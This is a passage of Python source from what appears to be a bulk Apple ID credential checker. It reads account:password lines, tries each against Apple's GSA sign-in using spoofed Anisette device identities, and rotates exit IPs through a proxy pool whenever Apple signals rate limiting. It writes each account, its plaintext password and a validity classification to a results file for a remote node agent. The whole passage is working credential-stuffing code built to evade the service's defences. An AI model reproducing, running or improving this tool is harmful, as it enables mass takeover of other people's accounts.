                identities[index] = pool.fetch_headers(
                    index, infos[index], max(timeout, 40), registered=ready,
                    proxy=bootstrap_proxy, provider_direct=True)
            refreshed = pool.inspect(index)
            device_labels[index] = (_device_id_label(refreshed.get('device_id')) or
                                    device_labels[index])
            if not ready and refreshed['state'] == 'ready':
                record_device_registration(device_root, index, bootstrap_proxy,
                                           profile.get('model', ''))
            if proxy_pool is not None:
                proxy_pool.release(bootstrap_lease, healthy=True)
        except Exception as exc:                                   # noqa: BLE001
            infos[index] = None
            identities[index] = None
            if proxy_pool is not None:
                proxy_pool.release(bootstrap_lease, healthy=False)
            if debug_enabled:
                _write_proxy_debug(
                    debug_path, 'bootstrap_error', slot=index,
                    wait_ms=round((time.monotonic() - bootstrap_started) * 1000, 2),
                    endpoint=bootstrap_identity['endpoint'],
                    host=bootstrap_identity['host'], port=bootstrap_identity['port'],
                    error_type=type(exc).__name__, detail=_proxy_debug_detail(exc),
                    pool_before=bootstrap_before,
                    pool_after=_proxy_pool_snapshot(proxy_pool))

    thread_state = threading.local()

    def state_for_thread():
        state = getattr(thread_state, 'value', None)
        if state is not None:
            return state
        match = re.search(r'_(\d+)$', threading.current_thread().name)
        worker_index = int(match.group(1)) if match else 0
        slot_id = slot_ids[worker_index % len(slot_ids)]
        state = {'slot': slot_id, 'proxy': None, 'identity': None, 'identity_uses': 0,
                 'info': None, 'device_label': ''}
        thread_state.value = state
        return state

    def proxy_for(index, force=False):
        if proxy_pool is not None:
            # Pool exhaustion is backpressure, not an account result.  A
            # healthy exit may be busy in another worker and become reusable
            # after that request finishes, so keep waiting while the pool has
            # any known (queued or leased) inventory.  Only report an empty
            # pool after both queues and all active leases have remained empty
            # for a full supplier window.
            empty_since = None
            while not stop.is_set():
                lease = proxy_pool.acquire(wait=PROXY_ACQUIRE_WAIT_SECONDS)
                if lease is not None:
                    return lease[0], lease
                state = _proxy_pool_snapshot(proxy_pool)
                if int(state.get('known') or 0) > 0:
                    empty_since = None
                    continue
                now = time.monotonic()
                if empty_since is None:
                    empty_since = now
                if now - empty_since >= PROXY_EMPTY_GRACE_SECONDS:
                    break
            return None, None
        state = state_for_thread()
        if not state['proxy']:
            state['proxy'] = proxy
        return state['proxy'], None

    def apple_retry_later(result):
        apple_text = ' '.join(str(result.get(key) or '').strip()
                              for key in ('apple_message', 'reason', 'detail')).casefold()
        phrases = (
            'unable to sign you in to your apple account. try again later',
            'this request could not be completed because of a server error',
            'this action cannot be completed',
            'this action could not be completed. try again',
            'the request cannot be processed at this time. please try again later',
            'we cannot process your request, please try again later',
            'your account information was entered incorrectly',
        )
        return any(phrase in apple_text for phrase in phrases)

    def retryable_transport(result):
        try:
            http = int(result.get('http'))
        except (TypeError, ValueError):
            http = None
        try:
            apple_ec = int(result.get('apple_ec'))
        except (TypeError, ValueError):
            apple_ec = None
        # 没拿到 HTTP 响应、服务不可用、Apple 明确要求稍后再试，或
        # Anisette/设备环境失效时重试。重试次数仍严格受用户设置控制。
        return (http in (0, 503)
                or apple_ec in (-22421, -22410, -332000, -33200, -3000303)
                or apple_retry_later(result))

    def auth_result_bucket(result):
        try:
            http = int(result.get('http'))
        except (TypeError, ValueError):
            http = None
        if http in (0, 503):
            return 'timeout'
        bucket = result_bucket(result)
        # 没有命中内置英文原因的结果保留为“其他错误”，
        # 不再因某个 Apple ec 错误码而猜测账号已失效。
        return 'undetermined' if bucket in ('undetermined', 'unknown') else bucket

    identity_default = object()
    usage_base = _usage_snapshot(device_root)
    usage_counts = Counter()
    usage_resets = set()
    usage_lock = threading.Lock()

    def retire_device_if_due(slot_id, worker_state):
        with usage_lock:
            used = int(usage_base.get(slot_id, 0)) + int(usage_counts.get(slot_id, 0))
            if used < device_use_limit:
                return False
            pool.reset(slot_id)
            usage_base[slot_id] = 0
            usage_counts[slot_id] = 0
            usage_resets.add(slot_id)
            try:
                (Path(device_root) / 'registrations' / f'{int(slot_id):03d}.json').unlink()
            except OSError:
                pass
            if worker_state is not None:
                worker_state.update(identity=None, identity_uses=0,
                                    info=None, device_label='')
            device_labels.pop(slot_id, None)
            return True

    def mark_device_used(slot_id):
        with usage_lock:
            usage_counts[slot_id] += 1

    def one(row, index, line, start_attempt=0, account_started=None,
            identity_override=identity_default, previous_proxy=None,
            force_proxy=False):
        if stop.is_set():
            return row, line, {'status': 'unknown', 'kind': 'stopped'}
        account, password = _split_account(line)
        account_started = time.time() if account_started is None else account_started
        worker_state = state_for_thread() if runtime_proxy_pool or proxy_pool is None else None
        if worker_state is not None:
            slot_id = worker_state['slot']
            _ignored, account_prefix = _slot_for_account(account, [slot_id])
        else:
            slot_id, account_prefix = _slot_for_account(account, slot_ids)
        # 空白行仍是输入文件中的一条记录，但不应触发真实认证请求。
        # 作为未判断结果落盘，保证小包按描述的 rows 正常完成。
        if not line.strip():
            return row, line, {'status': 'undetermined', 'kind': 'blank_record',
                               'slot': slot_id, 'device_key': account_prefix, 'elapsed': 0}
        if start_attempt == 0:
            retire_device_if_due(slot_id, worker_state)
            if (worker_state is not None
                    and int(worker_state.get('identity_uses') or 0) >= public_header_use_limit):
                worker_state['identity'] = None
                worker_state['identity_uses'] = 0
        if worker_state is not None:
            identity = worker_state['identity']
        else:
            identity = (identities.get(slot_id) if identity_override is identity_default
                        else identity_override)
        result = None
        previous_proxy = previous_proxy or {'endpoint': '', 'host': '', 'port': None}
        # 用户设置的重试次数仍是唯一上限；节点池只负责每次重试换出口，
        # 不会在“0 次重试”时暗中多发请求。
        attempt_limit = retries + 1
        for attempt in range(start_attempt, attempt_limit):
            elapsed = time.time() - account_started
            remaining_budget = item_timeout - elapsed
            if remaining_budget <= 0:
                result = {'status': 'error', 'kind': 'timeout', 'http': 0,
                          'stage': 'budget', 'detail': '单账号总预算已耗尽',
                          '_proxy_retries': max(0, attempt - 1),
                          '_budget_hit': True}
                break
            attempt_timeout = max(0.1, min(timeout, remaining_budget))
            acquire_before = _proxy_pool_snapshot(proxy_pool) if debug_enabled else {}
            acquire_started = time.monotonic() if debug_enabled else None
            account_proxy, lease = proxy_for(index + attempt, force=force_proxy)
            force_proxy = False
            acquire_ms = (round((time.monotonic() - acquire_started) * 1000, 2)
                          if debug_enabled else None)
            current_proxy = (_proxy_identity(account_proxy) if debug_enabled else
                             {'endpoint': '', 'host': '', 'port': None})
            switch = {
                'previous_endpoint': previous_proxy['endpoint'],
                'host_changed': (previous_proxy['host'] != current_proxy['host']
                                 if previous_proxy['host'] else None),
                'port_changed': (previous_proxy['port'] != current_proxy['port']
                                 if previous_proxy['port'] is not None else None),
                'pair_changed': (previous_proxy['endpoint'] != current_proxy['endpoint']
                                 if previous_proxy['endpoint'] else None),
            }
            if descriptor.get('proxy_api') and not account_proxy:
                result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                          'stage': 'init', 'detail': '线程未能获取代理出口'}
                if debug_enabled:
                    _write_proxy_debug(
                        debug_path, 'proxy_unavailable', row=row, slot=slot_id,
                        attempt=attempt, attempt_limit=attempt_limit,
                        request_sent=False, acquire_ms=acquire_ms, **switch,
                        pool_before=acquire_before,
                        pool_after=_proxy_pool_snapshot(proxy_pool))
                if attempt + 1 >= attempt_limit:
                    result['_proxy_retries'] = attempt
                    break
                result.update(_retry_at=time.monotonic() + retry_delay,
                              _retry_attempt=attempt + 1,
                              _retry_started=account_started,
                              _retry_identity=identity,
                              _retry_previous=current_proxy,
                              _retry_force_proxy=True)
                return row, line, result
            request_started = time.monotonic() if debug_enabled else None
            try:
                if identity is None:
                    # 预取失败的槽位在这里补一次
                    inspected = pool.inspect(slot_id)
                    ready = inspected['state'] == 'ready'
                    profile = device_profile(pool, slot_id)
                    # The per-device profile already supplies every field used
                    # by the header client. Avoid DevicePool.info() and its
                    # process-wide .info.lock entirely on the task hot path.
                    info = {'client_info': profile['client_info'],
                            'user_agent': profile['user_agent']}
                    with header_gate:
                        identity = pool.fetch_headers(
                            slot_id, info, max(0.1, min(max(timeout, 40), remaining_budget)),
                            registered=ready,
                            proxy=account_proxy, provider_direct=True)
                    if worker_state is not None:
                        worker_state['info'] = info
                        worker_state['identity'] = identity
                        worker_state['device_label'] = _device_id_label(
                            pool.inspect(slot_id).get('device_id') or
                            inspected.get('device_id'))
                        device_labels[slot_id] = worker_state['device_label']
                    if not ready and pool.inspect(slot_id)['state'] == 'ready':
                        record_device_registration(device_root, slot_id, account_proxy,
                                                   profile.get('model', ''))
                if (worker_state is not None and start_attempt == 0 and attempt == 0):
                    worker_state['identity_uses'] = int(worker_state.get('identity_uses') or 0) + 1
                # 每次协议请求使用当前线程自己的出口。
                result = gsa_check(account, password, account_proxy,
                                   timeout=attempt_timeout,
                                   retries=0 if proxy_pool is not None else retries,
                                   cancel=stop.is_set, identity=identity)
                if descriptor.get('_web_secondary_auth'):
                    def rotate_web(web_attempt):
                        nonlocal account_proxy, lease, current_proxy
                        if proxy_pool is not None:
                            if lease is not None:
                                proxy_pool.discard(lease)
                                lease = None
                            account_proxy, lease = proxy_for(index + attempt + web_attempt)
                            current_proxy = (_proxy_identity(account_proxy)
                                             if debug_enabled else current_proxy)
                            return account_proxy, account_proxy is not None
                        return account_proxy, False

                    if proxy_pool is not None:
                        result = _refine_repair_auth_with_rotation(
                            result, account, password, account_proxy, attempt_timeout,
                            stop.is_set, retries, rotate_web)
                    else:
                        result = _refine_repair_auth(
                            result, account, password, account_proxy, attempt_timeout,
                            stop.is_set, retries=retries)
            except Exception as exc:                               # noqa: BLE001
                result = {'status': 'error', 'kind': type(exc).__name__, 'http': 0,
                          'stage': 'init', 'detail': str(exc)[:180]}
            request_ms = (round((time.monotonic() - request_started) * 1000, 2)
                          if debug_enabled else None)
            transport_failed = retryable_transport(result)
            budget_hit = time.time() - account_started >= item_timeout
            if budget_hit:
                result['_budget_hit'] = True
            try:
                result_http = int(result.get('http'))
            except (TypeError, ValueError):
                result_http = None
            try:
                apple_ec = int(result.get('apple_ec'))
            except (TypeError, ValueError):
                apple_ec = None
            try:
                web_http = int(result.get('web_http'))
            except (TypeError, ValueError):
                web_http = None
            web_failed = (str(result.get('web_status') or '').casefold() == 'error'
                          and web_http in (0, 500, 502, 503, 504))
            # HTTP 0 and transient 5xx are retry outcomes: remove that exact lease now,
            # wait five seconds, then acquire an available (never in-use) exit.
            # Proxy-auth 407 and other transport failures retain the general
            # three-strike policy used outside this retry branch.
            # 明确重试条件都淘汰当前出口，等待 5 秒后从池中获取
            # 另一条 IP；否则刚释放的健康租约可能被同一账号再次拿到。
            immediate_discard = (result_http in (0, 503) or web_failed
                                 or apple_ec in (-22410, -332000, -33200, -3000303)
                                 or apple_retry_later(result))
            healthy_exit = result_http not in (None, 0, 407) and not web_failed
            if proxy_pool is not None and lease is not None:
                if immediate_discard:
                    proxy_pool.discard(lease)
                else:
                    proxy_pool.release(lease, healthy=healthy_exit)
            elif worker_state is not None and transport_failed:
                # No global pool: only this worker forgets its failed endpoint.
                # Its next retry obtains exactly one replacement directly.
                worker_state['proxy'] = None
            if debug_enabled and (web_failed or int(result.get('web_attempts') or 0) > 1):
                _write_proxy_debug(
                    debug_path, 'web_retry_result', row=row, slot=slot_id,
                    web_http=web_http,
                    web_status=str(result.get('web_status') or ''),
                    web_attempts=int(result.get('web_attempts') or 0),
                    web_proxy_rotations=int(result.get('web_proxy_rotations') or 0),
                    web_rotation_exhausted=bool(result.get('web_rotation_exhausted')),
                    last_endpoint=current_proxy['endpoint'],
                    release=('discarded' if immediate_discard else 'reusable'),
                    pool=_proxy_pool_snapshot(proxy_pool))
            if debug_enabled and transport_failed:
                debug_event = 'timeout_attempt'
                exit_ip_debug.submit(
                    account_proxy, debug_event, row=row, slot=slot_id,
                    attempt=attempt, attempt_limit=attempt_limit,
                    previous_endpoint=previous_proxy['endpoint'],
                    port_changed=switch['port_changed'],
                    pair_changed=switch['pair_changed'])
                _write_proxy_debug(
                    debug_path, debug_event,
                    row=row, slot=slot_id, attempt=attempt, attempt_limit=attempt_limit,
                    request_sent=True, acquire_ms=acquire_ms, request_ms=request_ms,
                    endpoint=current_proxy['endpoint'], host=current_proxy['host'],
                    port=current_proxy['port'], **switch, http=result_http,
                    status=str(result.get('status') or ''), kind=str(result.get('kind') or ''),
                    stage=str(result.get('stage') or ''),
                    detail=_proxy_debug_detail(result.get('detail')),
                    retryable=transport_failed,
                    lease_reused=bool(lease and int(lease[2]) > 0),
                    release=('discarded' if immediate_discard else
                             ('reusable' if healthy_exit else 'failure_recorded')),
                    pool_before=acquire_before, pool_after=_proxy_pool_snapshot(proxy_pool))
            if apple_ec in (-22421, -22410, -332000, -33200, -3000303):
                # 这不是账号结论；下一次重新获取 Anisette 身份，避免用
                # 同一份无效设备认证数据重复请求。
                identity = None
                if worker_state is not None:
                    worker_state['identity'] = None
            previous_proxy = current_proxy
            if (not transport_failed or attempt + 1 >= attempt_limit
                    or budget_hit):
                result['_proxy_retries'] = attempt
                break
            # Return this account to the coordinator's delayed retry heap.
            # No worker thread sleeps during the five-second backoff.
            result.update(_retry_at=time.monotonic() + retry_delay,
                          _retry_attempt=attempt + 1,
                          _retry_started=account_started,
                          _retry_identity=identity,
                          _retry_previous=current_proxy,
                          _retry_force_proxy=True)
            return row, line, result
        if result is None:
            result = {'status': 'error', 'kind': 'proxy', 'http': 0,
                      'stage': 'init', 'detail': '线程未获取代理结果', '_proxy_retries': 0}
        result['elapsed'] = round(time.time() - account_started, 2)
        result['slot'] = slot_id
        result['device_key'] = account_prefix
        mark_device_used(slot_id)
        if debug_enabled and (auth_result_bucket(result) == 'timeout'
                              or (str(result.get('web_status') or '').casefold() == 'error'
                                  and result.get('web_http') in (0, 500, 502, 503, 504))):
            _write_proxy_debug(
                debug_path, 'final_timeout', row=row, slot=slot_id,
                recorded_retries=int(result.get('_proxy_retries') or 0),
                configured_retries=retries, http=result.get('http'),
                kind=str(result.get('kind') or ''), stage=str(result.get('stage') or ''),
                detail=_proxy_debug_detail(result.get('detail')),
                last_endpoint=previous_proxy['endpoint'],
                pool=_proxy_pool_snapshot(proxy_pool))
        return row, line, result

    stop_flag = stop
    output_digest = hashlib.sha256()
    with (directory / 'input.part').open('r', encoding='utf-8', errors='replace') as source, output_path.open('wb') as output:
        output_path.chmod(0o600)
        first_row = int(descriptor.get('first_row') or 1)
        with ThreadPoolExecutor(max_workers=workers,
                                thread_name_prefix='auth-worker') as workers_pool:
            # 普通账号持续填充线程；需要重试的账号进入时间堆，延迟到期
            # 后再提交，不占用工作线程，也不会阻塞后面的账号。
            pending = set()
            ready = deque()
            delayed = []
            retry_order = 0
            index = 0
            exhausted = False
            while not exhausted or pending or ready or delayed:
                if stop_flag.is_set():
                    raise InterruptedError('租约失效或节点关闭')
                now = time.monotonic()
                while delayed and delayed[0][0] <= now:
                    _at, _order, work = heapq.heappop(delayed)
                    ready.append(work)
                while len(pending) < workers * 2:
                    if ready:
                        work = ready.popleft()
                    elif not exhausted:
                        line = source.readline()
                        if line == '':
                            exhausted = True
                            continue
                        line = line.rstrip('\r\n')
                        work = (first_row + index, index, line)
                        index += 1
                    else:
                        break
                    pending.add(workers_pool.submit(one, *work))
                if not pending:
                    if delayed:
                        stop_flag.wait(min(0.05, max(0.0, delayed[0][0] -
                                                     time.monotonic())))
                    continue
                wait_timeout = 0.25
                if delayed:
                    wait_timeout = min(wait_timeout, max(0.0, delayed[0][0] -
                                                         time.monotonic()))
                finished, _unfinished = wait(pending, timeout=wait_timeout,
                                             return_when=FIRST_COMPLETED)
                if not finished:
                    continue
                future = finished.pop()
                pending.remove(future)
                row, line, result = future.result()
                retry_at = result.pop('_retry_at', None)
                if retry_at is not None:
                    work = (row, row - first_row, line,
                            int(result.pop('_retry_attempt')),
                            result.pop('_retry_started'),
                            result.pop('_retry_identity'),
                            result.pop('_retry_previous'),
                            bool(result.pop('_retry_force_proxy', False)))
                    retry_order += 1
                    heapq.heappush(delayed, (float(retry_at), retry_order, work))
                    continue
                status = auth_result_bucket(result)
                counters[status] += 1
                processed += 1
                # sha256/bytes 是总控的必需字段（结果完整性校验），认证模式同样补齐
                raw_line = line.encode('utf-8')
                account, password = _split_account(line)
                device = result.get('slot') or slot_ids[(row - first_row) % len(slot_ids)]
                business_code = result.get('apple_ec')
                if business_code is None:
                    business_code = (result.get('detail') or result.get('kind') or '')[:180]
                reason = _apple_reason_for_record(result, status, debug_enabled)
                record = {'row': row, 'account': account, 'password': password, 'status': status,
                          'sha256': hashlib.sha256(raw_line).hexdigest(), 'bytes': len(raw_line),
                          'stage': result.get('stage') or '', 'http': result.get('http'),
                          'code': str(business_code)[:180], 'reason': reason,
                          'protocol': 'GSA',
                          'device': device,
                          'device_key': result.get('device_key') or '',
                          'device_label': device_labels.get(device, ''),
                          'elapsed': result.get('elapsed'),
                          'attempts': max(
                              int(result.get('_proxy_retries') or 0),
                              max(0, int(result.get('web_attempts') or 0) - 1))}
                for key in ('two_factor_method', 'web_auth_type', 'web_http',
                            'web_status', 'web_stage', 'web_kind', 'web_detail',
                            'web_attempts', 'web_server', 'web_via',
                            'web_retry_after', 'web_content_type',
                            'web_response_bytes', 'web_response_sha256',
                            'web_response_keys', 'web_service_error_codes',
                            'web_has_session_headers', 'web_has_set_cookie',
                            'web_proxy_rotations', 'web_rotation_exhausted'):
                    if result.get(key) not in (None, ''):
                        record[key] = result[key]
                encoded = (json.dumps(record, separators=(',', ':')) + '\n').encode()
                output.write(encoded)
                output_digest.update(encoded)
                now = time.monotonic()
                if now - last_progress >= 0.25:
                    # The node agent tails this local file once per second and
                    # sends one bounded batch.  Flush here without any network
                    # work in the worker process.
                    output.flush()
                    atomic_json(directory / 'progress.json',
                                {'processed': processed, 'started': started,
                                 'counts': dict(counters)})
                    last_progress = now

    if processed != int(descriptor.get('rows') or 0):
        raise ValueError('输入条数和工作包描述不一致')
    if usage_resets:
        _bump_usage(device_root, usage_counts, usage_resets)
    else:
        _bump_usage(device_root, usage_counts)
    atomic_json(directory / 'progress.json',
                {'processed': processed, 'started': started,
                 'counts': dict(counters)})
    atomic_json(directory / 'done.json',
                {'ok': True, 'processed': processed, 'counts': dict(counters),
                 'checksum': output_digest.hexdigest(),
                 'elapsed': time.time() - started})
    if debug_enabled:
        exit_ip_debug.close()
        _write_proxy_debug(debug_path, 'worker_stop', ok=True, processed=processed,
                           counts=dict(counters), pool=_proxy_pool_snapshot(proxy_pool),
                           exit_ip_probe=exit_ip_debug.snapshot())
